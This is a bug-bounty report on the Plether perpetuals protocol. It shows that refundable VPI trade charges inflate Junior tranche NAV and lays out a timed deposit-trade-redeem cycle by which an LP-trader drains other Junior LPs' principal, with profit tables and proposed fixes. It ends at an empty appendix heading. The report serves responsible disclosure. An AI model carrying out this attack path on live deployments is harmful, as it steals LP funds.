# \#97636 [SC-Critical] Refundable open-VPI is booked into Junior NAV, so an LP who also trades can round-trip around its own redemption and take other Junior LPs’ principal

**Submitted on Nov 2nd 2026 at 15:04:28 UTC by @Sharkeeeeeee for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97636
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

- **Assets:** `HousePool.sol`, `TrancheVault.sol` (Junior instance), `CfdEngineSettlementSidecar.sol` and `libraries/HousePoolAccountingLib.sol` in `packages/perps/src`, audit-comp-plether commit `a82d4fef` (Arbitrum One).
- **Selected impact:** Critical, "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". The funds are Junior LP principal.
- **Parameters:** the release parameters in `packages/perps/DEPLOYMENT.md:123-155`. The PoC uses all of them unchanged.

Test numbers refer to the Proof of Concept section.

**TL;DR**

- **Bug:** a trader's VPI charge on a skew-increasing open is counted as distributable LP value as soon as it is paid, although the lifetime clamp returns it to the same position when it closes at the same skew.
- **Exploit:** an LP who also trades opens a large position just before its own Junior redemption is priced, redeems at the raised price, then closes and gets the charge back. The Junior LPs who stay repay it. No price move, oracle manipulation or privileged role is needed, and the cycle repeats every 3 hours.
- **Representative result (test 4):** with a temporary deposit of 2 × the incumbent Junior and equal Senior and Junior, the incumbent's 10.00 M Junior ends at 8.53 M after 21 days, against 9.97 M in an honest run. The attacker makes 700 k, or about 608 k after an assumed 8 % cost of capital.
- **Why it is not a design choice:** the charge is a refundable deposit, not revenue. LPs who stay end below where they started, which the documented carry-timing policy never causes, and honest LPs are mispriced the same way (tests 8, 9).
- **Bound:** the drain stops at the Junior covenant floor, at most `1 − S/(4J)` of incumbent Junior.

## 1. Summary

When a trader opens a skew-increasing position, the VPI charge it pays goes straight into HousePool cash and is booked as LP revenue. Under the lifetime clamp, the same position gets that charge back as a rebate when it closes at the same skew. Tranche share prices are computed from pool cash, so the charge raises the Junior share price while the position is open and lowers it again when the position closes.

The attacker deposits into Junior, opens a large position just before its own redemption epoch is priced, redeems at the raised price, then closes the position and gets the charge back. Pool depth sets both the skew cap and the size of the charge, and it counts all Senior capital plus the attacker's temporary deposit. The charge therefore grows with capital that does not share the loss, while the loss falls only on the other Junior LPs.

Results use the release parameters, the competition compiler settings, a basket price fixed at 1.05 and an oracle confidence of 3 bp. One address holds the entire incumbent Junior tranche (10 M USDG); W is the attacker's temporary Junior deposit. "Loss" is measured against an honest run from the same snapshot that makes the same deposits and redemptions without the trade. "Profit" is what the attacker ends with compared with not taking part at all, after every fee, the confidence shift and its share of the Senior coupon; the figure in parentheses also subtracts an assumed 8 % a year cost of capital on W.

| Scenario | Test | Duration | Incumbent Junior value: start → honest → attack | Loss | Profit (after cost of capital) | Attacker's share of the loss, after cost of capital |
|---|---|---|---|---|---|---|
| W = 2 ×, Senior = Junior | 4 | 120 cycles, 21 days | 10.00 M → 9.97 M → **8.53 M** | **1,431,164 (14.31 %)** | 699,788 (607,733) | 42 % |
| W = 1 ×, Senior = 3 × Junior | 2 | 120 cycles, 21 days | 10.00 M → 9.89 M → **8.84 M** | **1,050,895 (10.51 %)** | 115,037 (69,010) | 7 % |
| W = 5 × (a 50 M deposit), Senior = 3 × Junior, until the covenant floor | 3 | 65 cycles, 10 days | 10.00 M → 9.96 M → **7.48 M** | **2,477,869 (24.78 %)** | 1,571,077 (1,461,488) | 59 % |
| W = 0.5 ×, Senior = 3 × Junior, another trader already holds skew of 30 % of depth | 6 | 30 cycles, about 3.75 days | 10.02 M → 10.00 M → **9.94 M** | 65,760 (0.66 %) | 17,121 (13,011) | 20 % |

Measured against the honest run, each loss equals the attacker's gain plus its opening execution fees, which reach the protocol treasury (Appendix A). The W = 5 × row needs a 50 M deposit, more than the 40 M pool and slightly more than the 48.5 M USDG now on Arbitrum (§9).

**One cycle, worked through (test 1, W = 1 ×, Senior = 3 × Junior, 3 bp confidence).** Figures are rounded; the last two rows are measured averages over the test's 30 cycles.

| Step | Amount |
|---|---|
| Depth after the attacker's 10 M deposit, D | 50.0 M |
| Attacker's LONG, n = 0.38 · D | 19.0 M notional |
| VPI charge paid into the pool, C = 0.01 · 0.38² / 2 · D | 36.1 k |
| Attacker's share of Junior at the settlement, s | 50 % |
| Extra paid out in the attacker's redemption, s · C | +18.05 k |
| Execution fees, 4 bp each leg (open to treasury, close stays in pool) | −7.60 k, −7.60 k |
| Confidence shift, (2 − s) · 0.75 bp · n | −2.14 k |
| Attacker's share of the Senior coupon for about 2 h | −0.27 k |
| Close: the full 36.1 k charge is refunded from pool cash | 0 net for the trader |
| Attacker per cycle, measured | +0.55 k |
| Incumbent Junior per cycle, measured | −8.41 k |

The incumbent's 8.41 k is the attacker's 18.05 k capture less what flows back to the pool: the 7.60 k closing fee and most of the confidence shift. The line items give +0.44 k for the attacker against the measured +0.55 k; the gap is rounding and the coupon estimate.

## 2. Root cause

### 2.1 The open's VPI charge becomes pool revenue immediately

`CfdEngineSettlementSidecar.sol:446-463`. On an open, any positive trade cost that is not credited to the protocol fee is recorded as pool revenue with the cash already arrived:

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
```

For a skew-increasing open, the VPI charge is part of `tradeCostAssets`. It is the change in the potential `P(S) = vpiFactor · S² / (2 · depth)` between the pre-trade and post-trade skew (`CfdMath.sol:121-140`; `WHITEPAPER.md:850-857`).

### 2.2 The charge comes back when skew returns

A close that reduces skew receives a VPI rebate paid out of pool cash (`CfdEngineSettlementSidecar.sol:621-624`). The rebate is a fresh curve delta at the close's skew and depth, capped by the lifetime clamp at the VPI the position has paid (`SECURITY.md:1443`: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"). The rebate goes to whichever trade reduces skew; when skew has not changed in between, that is the position that paid the charge. Three conditions apply:

- it is paid only from pool cash left free after trader claims, and any unfunded remainder is waived (`ACCOUNTING_SPEC.md:1061-1063`);
- it is smaller if other trades have reduced skew in the meantime;
- it is smaller if depth has risen in the meantime, because the fresh delta is computed at the higher depth and the clamp limits the rebate only from above.

None of them binds in the attack. The position is open for about two minutes, and in the PoC the pool holds tens of millions in free cash against a refund of tens of thousands. Depth at the close is lower because the attacker's deposit has left, which makes the fresh rebate larger than the charge. The whitepaper notes that changing depth breaks the fixed-potential assumption and that "the position lifetime clamp can truncate close rebates" (`WHITEPAPER.md:863-865`); here that truncation brings the larger rebate back to the amount paid. With zero oracle confidence the attacker's trade legs cost 454,682.52 USDG over 30 cycles against 454,662.10 USDG of execution fees. The 20.42 USDG gap, about 0.7 USDG per cycle, is carry for the minutes the position is open plus rounding, so the VPI nets to zero. Test 7 asserts this.

### 2.3 Tranche pricing counts that cash as distributable

`HousePoolAccountingLib.buildReconcileSnapshot` (`:60-78`) prices the pool as physical assets plus the terminal price delta, minus trader claims:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
...
snapshot.distributable = terminalAssets - terminalLiabilities;
```

`physicalAssets` is `HousePool.totalAssets()` (`CfdEngineProtocolLens.sol:63-64`). `settleLpEpoch` reconciles with this snapshot (`HousePool.sol:835`), then prices and funds the Junior redemption phase from it (`HousePool.sol:839-889`). The terminal NAV book is price-only and has no VPI term. The refundable charge therefore sits inside `physicalAssets` with nothing offsetting it, and every redemption funded in that settlement is paid at the raised price.

### 2.4 Depth amplification

Economic depth is pool assets net of trader claims (`SECURITY.md:1438`). It includes all Senior capital and the attacker's freshly settled Junior deposit. The skew cap (`maxSkewRatio = 0.4 × depth`) and the largest possible charge (about `0.0008 × depth` at the cap) both grow with depth, while the victims' holdings do not. A temporary deposit therefore raises the attacker's share of Junior and the size of the price bump at once, and Senior capital adds to the bump without adding to the Junior that shares it. This sets how much each cycle drains, not the capital at which the attack starts to pay, because the fees and the confidence cost grow with depth at the same rate as the charge (§6). Junior has no deposit cap (`TrancheVault.sol:1313-1325`). The attacker's capital is locked for about 3 hours per cycle: a 1 h LP epoch (`HousePool.sol:178`) plus the 1 h deposit cooldown (`TrancheVault.sol:38`).

## 3. Why this is a defect and not a design choice

The protocol accounts on a cash basis. Anticipated carry, VPI and fees stay outside the terminal NAV book, terminal `K` (`ACCOUNTING_SPEC.md:1064-1066`), and positive VPI "increases physical pool assets" as soon as it is paid (`WHITEPAPER.md:411-412`). We do not dispute cash-basis accounting as such. The problem is what the lifetime clamp turns an open charge into.

**The documented timing risk is a different thing.** The docs warn that the five-minute LP cutoff "is not an immutable settlement snapshot" and that after it "trading, closes, liquidations, claims, carry, and pool accounting can change NAV" (`SECURITY.md:1044-1048`). The whitepaper adds: "Epochs do not remove ordinary timing and liveness risk" (`WHITEPAPER.md:742`). Those passages describe NAV moving with real economic events: price PnL, liquidations, carry collected. None of them is reversed by construction, and no single party decides both when it starts and when it ends. Here NAV is raised by a deposit that must flow back out, and the party that creates it also decides when it reverses. Redeeming in between is then not exposure to timing risk; it is a payment from the LPs who stay.

**An open charge is a refundable deposit, not revenue.** At unchanged skew the charge comes back to the same position (§2.2). After a same-price round trip the pool has earned nothing from VPI. Booking the deposit as distributable while it is held lets any LP who redeems in between take part of it, and the LPs who stay repay it when the position closes. They end below where they started, not just with a smaller gain: in test 2 the incumbent's Junior falls from 10.00 M to 8.84 M, while the honest run ends at 9.89 M.

**This is not the documented carry policy.** The whitepaper accepts that a trader and an incoming LP "can time collection after activation and share carry accrued before entry", and calls this "an intentional collection-time ownership policy" (`WHITEPAPER.md:974-977`). Carry is income the trader never gets back. Timing its collection changes which LPs share real revenue, and the pool keeps it. Timing VPI works differently: the money leaves again at the close, so the LPs who stay pay for the LP who left. Tests 8 and 9 show this with no attacker at all. An honest LP that exits while a position is open gains, and the LP that stays, or one that enters at that moment, loses.

**The protocol is already cautious in the opposite case.** When a trader receives a negative-VPI rebate that may be clawed back, it must lock a matching reserve from its own funds, and "the reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" (`WHITEPAPER.md:887-888`). The expected clawback is a receivable, and the protocol does not let LPs count it early. The expected refund of a positive charge is a liability, and nothing stops LPs withdrawing against it.

**Other designs.** In GMX v2, price impact paid by traders goes into a position impact pool. `MarketUtils.getPoolValueInfo` subtracts that pool from LP pool value ([v2.2, L387-391](https://github.com/gmx-io/gmx-synthetics/blob/ee721b7e2d1891312dde52964d774144208cd1a0/contracts/market/MarketUtils.sol#L387-L391)), positive price impact for trades that reduce imbalance is paid out of it ([L907-945](https://github.com/gmx-io/gmx-synthetics/blob/ee721b7e2d1891312dde52964d774144208cd1a0/contracts/market/MarketUtils.sol#L907-L945)), and it is released to LPs over time ([L2723-2766](https://github.com/gmx-io/gmx-synthetics/blob/ee721b7e2d1891312dde52964d774144208cd1a0/contracts/market/MarketUtils.sol#L2723-L2766)). That pool plays the role Plether's pool cash plays for close rebates, but LPs cannot withdraw it at once. The whitepaper cites Synthetix and Perennial as prior art for integrated skew pricing (`WHITEPAPER.md:890`). We have not analysed how they treat refundable premium in LP value, so we do not claim either way for them.

**Known issues and prior reports.** None of the LP accounting or VPI entries in Known Limitations (`SECURITY.md:1380-1400`, `:1434-1445`) covers LP share pricing during a VPI round trip; the clamp entry covers only the trader's own round trip. The Cecuro items that the program marks as known (MED-7, MED-13, MED-16, MED-22, MED-24, MED-29, MED-30, LOW-57, HIGH-1) are about other mechanisms; none of them involves VPI or LP pricing. None of the five reports in the repository's `audits/` folder describes it either. The closest is the scan report's informational item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" (`audits/scan-plether-fi-plether-core-d4541b49.md:1742`), which says a trader who lowers pool depth just before closing gets a larger rebate, up to the VPI it paid. This finding is different:

- **The trader gets back what it paid, no more.** With zero oracle confidence the attacker's trade legs cost the two execution fees plus a few USDG of carry (§2.2), so the extra rebate that item describes is zero here.
- **The attack does not depend on depth.** At unchanged depth the VPI charges telescope (`WHITEPAPER.md:850-857`), so a same-skew close refunds the full charge anyway. The attacker's deposit leaving before the close only makes the unclamped rebate larger, and the clamp removes that excess.
- **The LP loss comes from redemption pricing.** Junior is priced with the charge inside NAV and repriced without it after the close. Fixing the scan item, for example by using commit-time or time-weighted depth for the close, leaves this finding intact.

The five-minute LP request cutoff itself (`SECURITY.md:397-398`, `:1040-1044`) does not stop the attack. It limits LP requests into the maturing epoch, while the attacker's redemption is requested hours earlier and the trade is not an LP request.

## 4. Attack path

One cycle takes about 3 hours and repeats back to back on weekdays.

1. **Epoch e:** the attacker calls `TrancheVault.requestDeposit(W)` on the Junior vault. Anyone settles the epoch, and the attacker calls `claimDeposit`. This is an ordinary entry.
2. **After the 1 h cooldown:** the attacker calls `requestRedeem(all shares)`, which lands in epoch e+2.
3. **60 s before epoch e+2 starts:** from a trader account, the attacker calls `OrderRouter.commitOrder` for a LONG that brings aggregate skew to about 0.38 × economic depth, just under the skew cap. It then calls `executeOrder` itself. Execution is permissionless and follows a global FIFO queue (`OrderRouter.sol:25`, `:233-254`). The execution price must come from a Pyth update published within 15 s after the commit (`PletherOracle.sol:87`, `:610-612`). The VPI charge enters pool cash.
4. **After the epoch boundary:** any keeper calls `OrderRouter.settleLpEpoch`, which reaches `HousePool.settleLpEpoch`. The charge is reconciled into Junior principal and the attacker's redemption is funded at the raised share price. In the PoC an unrelated keeper does this.
5. The attacker calls `claimRedeem`.
6. The attacker closes the LONG at the same price. The close rebate returns the charge from pool cash, and the remaining Junior holders absorb the drop.

**Costs.** The attacker pays a 4 bp execution fee on each leg. The opening fee goes to the protocol treasury; the closing fee is deducted from the rebate and stays in the pool (`CfdEngineSettlementSidecar.sol:602-628`). Each leg also executes at a side-adverse price, shifted by 25 % of the basket confidence (`PletherOracle.sol:905-941`). The trader leg needs about 1 % margin: initial margin of 20 bp plus the liquidation reserve, fee and VPI.

**Deciding whether to run a cycle.** At a given price and confidence a cycle's outcome is deterministic, so the attacker can simulate it off-chain before committing. The PoC models this with a snapshot: it runs the cycle and reverts it if the attacker would not come out ahead. In practice the execution price uses a Pyth update published up to 15 s after the commit, so its confidence can differ from the confidence seen when committing; a wrong guess costs at most one cycle's fees and confidence shift.

**Timing and price risk.** The position is held for about two minutes across the epoch boundary. A basket move in that window is zero-mean and the attack does not need one; the PoC holds the price constant. At an assumed 7 % annual volatility for the dollar basket, two minutes give a standard deviation of roughly 1.6 bp. The charge, the opening fee and the liquidation reserve come out of the 1 % margin, which leaves roughly 55–65 bp above maintenance, more than 30 standard deviations. Over 120 cycles at W = 1 × this adds noise of about ±34 k USDG to an expected profit of 115 k. The cycle runs only on weekdays outside the FAD window, because opens are close-only during FAD and while the oracle is frozen.

## 5. Impact

- **Loss of other users' principal.** Incumbent Junior LPs end up with less than in the honest run and below their starting value, and the attacker ends up with more. Nothing depends on market movement.
- **Material and repeatable.** At Senior = Junior and W = 2 ×, the incumbent's 10.00 M falls to 8.53 M in 21 days (test 4). At Senior = 3 × Junior and W = 1 ×, it falls to 8.84 M in 21 days (test 2); with W = 5 ×, to 7.48 M in 10 days (test 3).
- **The leak exists without an attacker.** Any LP that redeems while a skew-increasing position is open is paid part of a charge that the position will take back, and the LPs who stay pay for it. In test 8 an ordinary 5 M Junior LP exits while an unrelated trader holds a LONG of 38 % of depth. It receives 8,116 USDG more than if it exits after the trader closes at the same price, and the 10 M LP who stays ends 8,099 USDG worse off. Entry is mispriced the same way: in test 9 a 5 M deposit that activates while the position is open is worth 6,125 USDG less after the close than the same deposit made after the close. There the deposit itself raises depth before the trader closes, so the trader's rebate falls short of its charge and the pool keeps the difference; 6,125 USDG therefore understates the overpayment. This passive leak corroborates the root cause; the severity rests on the attack.
- **Senior is not impaired.** The loss falls entirely on Junior LPs.

**Bound.** The drain stops when the attacker's own exit can no longer be fully funded. At Senior = 3 × Junior that happens at the Junior covenant floor (Junior ≥ Senior × 2000/8000): the drainable fraction of incumbent Junior is `1 − S/(4J)`, 25 % at S/J = 3 and nothing at S/J = 4, the most Senior the 80 % share cap allows. Below the floor the covenant holds the remaining Junior in place until it is cured (`SECURITY.md:1392-1393`); this is documented behaviour, and test 3 checks it only to show where the drain ends. At S/J = 1 the covenant floor is at 25 % of the incumbent Junior, so up to 75 % is exposed in principle, but the measured runs stop earlier for funding reasons (§6).

## 6. Capital and cost

In the PoC one address holds the whole incumbent Junior tranche, so W is a multiple of total Junior TVL, not of one user's balance. All figures are at 3 bp confidence unless noted. A cycle that would leave the attacker worse off than not taking part is not run, so 0 cycles means the attacker would not attack at that setting.

**Where the threshold comes from.** In one cycle the attacker tops aggregate skew up from K to T = 0.38 of depth D, with notional n = (T − K)·D. The charge is C = vpiFactor·(T² − K²)·D/2, so C/n = vpiFactor·(T + K)/2: 19 bp of notional at K = 0 and 34 bp at K = 0.30. The attacker captures s·C, where s is its share of Junior at the settlement. Its costs are:

- 4 bp of execution fee on each leg;
- (2 − s)·δ for the confidence shift, where δ = 25 % of the basket confidence: it loses δ on each leg and gets back its share of the open-leg loss through NAV;
- its share of the Senior coupon for the roughly two hours it holds Junior (8 % a year, the `seniorRateBps` default of 800 at `HousePool.sol:251`).

A cycle pays when

`s · C  >  (8 bp + (2 − s) · δ) · n  +  s · Senior · coupon · 2 h`

The fee and confidence terms grow with depth at the same rate as the charge, so the amount of Senior capital cancels out of them; only the small coupon term depends on Senior. At K = 0 and 3 bp the threshold is s ≈ 49 % (W ≈ 0.95 ×), and at W = 1 × the break-even confidence lies between 3.5 and 4 bp. Both match the tests below. More Senior capital, or a larger W, raises how much each cycle drains but barely moves the threshold. Pre-existing same-direction skew lowers it, because the charge grows with the square of skew while fees grow linearly. At K = 0.30 the formula gives s ≈ 29 % (W ≈ 0.40 ×), and test 6 puts the threshold between 0.4 × and 0.5 ×.

Capital needed with no other traders (test 5, 30 cycles):

| W (× incumbent Junior) | Cycles run | Loss | Profit |
|---|---|---|---|
| 0.5 | 0 (not profitable) | — | — |
| 0.75 | 0 (not profitable) | — | — |
| 1 | 30 | 252,242 (2.52 %) | 16,585 |
| 2 | 30 | 529,792 (5.30 %) | 246,430 |

Capital needed when an unrelated trader already holds same-direction skew of K % of depth (test 6, 30 cycles; each cell is loss / profit, "—" means not profitable):

| K | W = 0.25 × | 0.33 × | 0.4 × | 0.5 × |
|---|---|---|---|---|
| 20 % | — | — | — | 107,923 (1.08 %) / 5,435 |
| 30 % | — | — | — | 65,760 (0.66 %) / 17,121 |
| 35 % | — | — | — | 28,110 (0.28 %) / 6,348 |

Existing skew halves the capital the attacker needs, from about 1 × to 0.5 × Junior TVL. Each cycle then drains less, because the attacker's own trade is smaller.

Tranche ratio (test 4). Test 4 first lets the Senior LP redeem two thirds of its shares through the vault, leaving 10 M Senior against 10 M Junior. The attacker then runs up to 120 cycles:

| W | Cycles, days | Incumbent Junior value: start → honest → attack | Loss | Profit |
|---|---|---|---|---|
| 1 × | 120, 21 | 10.00 M → 9.96 M → 9.35 M | 613,755 (6.14 %) | 61,040 |
| 2 × | 120, 21 | 10.00 M → 9.97 M → 8.53 M | 1,431,164 (14.31 %) | 699,788 |
| 3 × | 88, 15 | 10.00 M → 9.98 M → 8.40 M | 1,581,205 (15.81 %) | 910,833 |

With less Senior capital each cycle drains less, but the capital threshold is the same. At an assumed 8 % cost of capital, W = 1 × keeps only about 15 k of its 61 k, while W = 2 × keeps about 608 k of 700 k, so W = 2 × is the representative case at this ratio. The W = 3 × run stops after 88 cycles because the attacker's 30 M redemption no longer fits in the free cash the pool keeps after reserving for the attacker's own open position, so the redemption is not fully funded. That is a funding limit, not the covenant.

Oracle confidence adds a cost on both legs (test 7, 30 cycles):

| Basket confidence | W | Loss | Profit |
|---|---|---|---|
| 0 bp | 1 × | 316,819 (3.17 %) | 81,293 |
| 1 bp | 1 × | 295,309 (2.95 %) | 59,740 |
| 2 bp | 1 × | 273,784 (2.74 %) | 38,171 |
| 3 bp | 1 × | 252,242 (2.52 %) | 16,585 |
| 3.5 bp | 1 × | 241,469 (2.41 %) | 5,791 |
| 4 bp | 1 × | not profitable | — |
| 9 bp (ceiling 10 bp) | 2 × | 392,153 (3.92 %) | 108,515 |
| 9 bp (ceiling 10 bp) | 5 × | 953,069 (9.53 %) | 531,205 |

**Observed confidence.** Hermes historical prices for 30 weekdays from 2026-09-21 to 2026-10-30, sampled every 2 hours (347 samples), give a median relative confidence of 0.26 bp for EUR/USD (90th percentile 0.44 bp) and 0.32 bp for USD/JPY (90th percentile 0.44 bp). Together these two feeds carry 71 % of the basket weight. Our API access did not cover the other four feeds (GBP, CAD, SEK, CHF), so the basket estimate adds them at the highest relative confidence seen for each in two on-chain snapshots, a fixed 0.82 bp. The resulting basket estimate has a median of 1.01 bp, a 90th percentile of 1.11 bp and a maximum of 1.29 bp, with no meaningful difference by hour of day. Every sample is far below the 3.5 bp at which W = 1 × stops paying, and the 3 bp used throughout the PoC is about three times the observed median. At 1 bp, W = 1 × earns 59,740 over 30 cycles instead of 16,585 (test 7). The attacker can check the current confidence before committing and skip a cycle when it is high.

**Capital.** The capital carries no price risk outside the two-minute window and is needed for about 3 hours per cycle; cycles run back to back, so W stays committed for the whole run. A flash loan cannot cover it. We have not checked how much USDG can be borrowed on Arbitrum or at what rate, so the 8 % a year used here is an assumed cost of capital. At that rate the cost is about 46 k USDG for W = 1 × over 21 days, against a profit of 115 k, and about 110 k for W = 5 × over 10 days, against 1.57 M. The trader leg needs margin of about 1 % of its notional, held for a few minutes.

## 7. Severity

The program assesses impact first, with the release parameters in `DEPLOYMENT.md`, and says feasibility limits affect only the payout, not the severity. The impact here is an attributable, deterministic and repeatable reduction of other users' Junior principal, with a positive expected profit for the unprivileged party that causes it. Capital, cost of capital and detection time are feasibility limits in that sense.

It is principal, not yield. In every scenario the incumbent ends below its starting value, not merely below the honest run: 10.00 M to 8.53 M in test 4, 8.84 M in test 2 and 7.48 M in test 3, while the honest runs end at 9.89–9.97 M.

The program's exclusions for basic economic attacks and Sybil attacks do not fit either. Nothing is bought or sold against outside liquidity, no market price moves, and no per-account limit is bypassed. One party needs an LP position and a trader account. The loss comes from the accounting itself: the protocol keeps an expected VPI clawback out of LP value, but lets LPs withdraw against an expected VPI refund (§3). It needs a code fix.

Expected objections:

- **"The profit is thin; this is griefing."** After an assumed 8 % cost of capital the attacker keeps 42 % of the victims' loss at W = 2 × (test 4) and 59 % at W = 5 × (test 3); at W = 1 × it keeps 7 % (test 2). Measured against the honest run, the rest of the victims' loss is the attacker's opening fees, which reach the treasury and do not reduce that loss. In every case there is a profit motive.
- **"This is the documented timing risk."** It is not: the documented risk is NAV moving with real events; here NAV is raised by a deposit that must reverse, and the attacker controls both ends (§3).
- **"It needs a lot of capital."** The capital is a multiple of Junior TVL: about 1 × with no other traders and 0.5 × when others already hold skew. It is needed for about 3 hours per cycle and carries no price risk outside a two-minute window. Both the loss and the profit scale with Junior TVL, so the percentages hold at any pool size, apart from fixed per-transaction costs such as gas and Pyth update fees.
- **"The loss is bounded."** It is bounded by the attacker's ability to fund its own exit and, at S/J = 3, by the covenant floor, which caps the drain at 25 % of Junior (§5). Within that bound it is repeatable and cumulative.
- **"Governance can pause it."** It can. `HousePool.pause()` needs no timelock and can be called by the owner or the pauser. It stops new deposit requests and defers deposit activation in both tranches, without touching redemptions or trading (`HousePool.sol:384-390`), and the guardian's emergency pause includes it (`SECURITY.md:470-472`). Every cycle needs a fresh deposit, so this stops the repeated attack, but it does not undo it. Someone has to recognise the pattern first, every completed cycle is final, and at W = 5 × Junior loses about 2.5 % a day until then. Pausing also closes LP entry for everyone until a fix ships, and it does not stop the exit side of the passive leak, which needs no deposit. Raising the execution fee instead goes through the 72-hour timelocked risk configuration (`CfdEngineAdmin.sol:20`, `:109-131`).

## 8. Recommended fix

Stop pricing the part of pool cash that skew-reducing trades will take back into tranche NAV until it is final. Three ways, from most to least precise:

1. **Exclude the curve potential.** When `buildReconcileSnapshot` computes `distributable`, subtract `min(vpiFactor · S² / (2 · D), Σ max(vpiAccrued, 0))`, the VPI potential at the current skew S and depth D, capped by what open positions have actually paid (`CfdTypes.sol:32`, `:41`). At fixed depth this follows the curve exactly (`WHITEPAPER.md:850-857`): an open raises the excluded amount by its charge, and any skew-reducing close lowers it by the rebate it is paid, so neither moves LP NAV. LP deposits and redemptions change D and therefore the excluded amount, so each LP flow should be priced at the depth it creates; otherwise entering or leaving would itself shift NAV slightly.
2. **Exclude the paid charges.** Subtract `Σ max(vpiAccrued, 0)` over open positions, maintained as a counter on open, increase, partial close (prorated, `WHITEPAPER.md:867-868`), full close and liquidation. This is simpler but cruder. After other trades reduce skew, the positions' accrued VPI overstates what can still be refunded, so NAV is held down by more than necessary and entrants buy cheap. The excess returns to NAV when the VPI becomes final (a full close or a liquidation, which refunds no positive VPI). That is a collection-time effect of the kind the whitepaper accepts for carry (`WHITEPAPER.md:974-977`), driven by liquidations or other traders' flow rather than by a round trip of the position itself. The same snapshot prices entry and exit (`HousePoolAccountingLib.sol:57`), so both sides see it.
3. **Hold positive charges in a pool-side reserve,** mirroring the negative-VPI reserve, and pay close rebates from it. This changes more: depth and the admission test read pool assets, so the fix must decide whether reserved cash still counts toward depth and the post-trade balance sheet.

Any of these restores the property that a same-skew VPI round trip leaves LP NAV unchanged. The trade-off is that VPI paid by ordinary traders reaches Junior only when skew comes back down or the VPI becomes final.

As a stopgap, an exit fee on Junior redemptions above the attack's gross margin per cycle (about 11–18 bp of W in these scenarios) makes the attack unprofitable, but it charges every LP. Excluding only the VPI received in the current epoch from redemption pricing is not enough: the attacker can open one epoch earlier and hold, at the cost of about an hour of carry.

## 9. Limitations

- **Price and oracle are mocked.** Pyth updates and USDG are mocked, as the program allows, and the basket price is fixed at 1.05. Price risk during the two-minute hold is estimated from an assumed 7 % annual volatility, not simulated.
- **Confidence data covers two of six feeds.** The 30-day sample in §6 covers EUR/USD and USD/JPY only; the other four feeds are added at a fixed, conservative value from two on-chain snapshots. The confidence used at execution can differ from the one seen at commit (§4).
- **Capital is assumed.** We did not check USDG borrowing liquidity or rates on Arbitrum; 8 % a year is an assumption. DefiLlama reports about 48.5 M USDG circulating on Arbitrum (read 2026-11-02, out of 2.86 B across chains; USDG is issued natively on Arbitrum since 2026-10-06). The W = 5 × case needs 50 M and is above that today; W = 1 × to 2 × of a 10 M Junior needs 10–20 M. The loss and the capital both scale with pool size.
- **Fixed costs are not counted.** Gas and Pyth update fees are not counted: the mock Pyth fee is zero and the long loops run with gas metering paused, so gas is not measured.
- **Tranche sizes are chosen.** 10 M Junior and 30 M Senior sit inside the release caps but are not a forecast of the launch balance sheet. The Arbitrum Sepolia testnet deployment holds about 1 M in each tranche, a 1:1 seed ratio that test 4 uses only as a second ratio. The test base seeds each tranche with 1,000 USDG instead of the release 1 USDG, which is negligible against 10 M.
- **Third-party skew is assumed in test 6.** The tests do not show how often other traders hold 20–35 % of depth in one direction; the testnet deployment had no open interest when read.
- **The passive results are single scenarios.** Tests 8 and 9 each use one position size and one LP size; test 9 is a lower bound (§5).
- **The fix is not implemented.** §8 describes it; no patched build was tested.

## 10. References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:416` (natspec), `:446-463` (open cost and revenue inflow), `:602-628` (close charge, rebate payout and fee)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:57-78` (`buildReconcileSnapshot`, shared by entry and exit pricing)
- `packages/perps/src/CfdEngineProtocolLens.sol:63-64` (`physicalAssets = pool.totalAssets()`)
- `packages/perps/src/HousePool.sol:178` (`LP_EPOCH_DURATION`), `:251` (`seniorRateBps` 800), `:384-390` (`pause`), `:797-889` (`settleLpEpoch`), `:1205-1217` (Junior covenant capacity)
- `packages/perps/src/TrancheVault.sol:38` (`DEPOSIT_COOLDOWN`), `:1313-1325` (`maxRequestDeposit`)
- `packages/perps/src/CfdMath.sol:121-140` (VPI curve); `CfdTypes.sol:32`, `:41` (`vpiAccrued`)
- `packages/perps/src/OrderRouter.sol:25`, `:233-254` (FIFO execution); `PletherOracle.sol:87`, `:610-612` (execution price window), `:905-941` (side-adverse price)
- `packages/perps/src/CfdEngineAdmin.sol:20`, `:109-131` (timelocked risk configuration)
- `packages/perps/WHITEPAPER.md:411-414`, `:742`, `:850-857`, `:863-865`, `:867-868`, `:887-888`, `:890`, `:974-977`
- `packages/perps/ACCOUNTING_SPEC.md:1061-1066`; `packages/perps/SECURITY.md:397-398`, `:470-472`, `:1040-1048`, `:1380-1400`, `:1392-1393`, `:1434-1445`, `:1438`, `:1443`
- `packages/perps/DEPLOYMENT.md:123-155` (release parameters)
- `audits/scan-plether-fi-plether-core-d4541b49.md:1742`
- GMX v2 `contracts/market/MarketUtils.sol` at tag v2.2 (`ee721b7`): L387-391, L907-945, L2723-2766
- Pyth Hermes historical price API (`/v2/updates/price/{publish_time}`); DefiLlama stablecoins API (USDG, Arbitrum)

## Appendix A. Measurement against the honest run

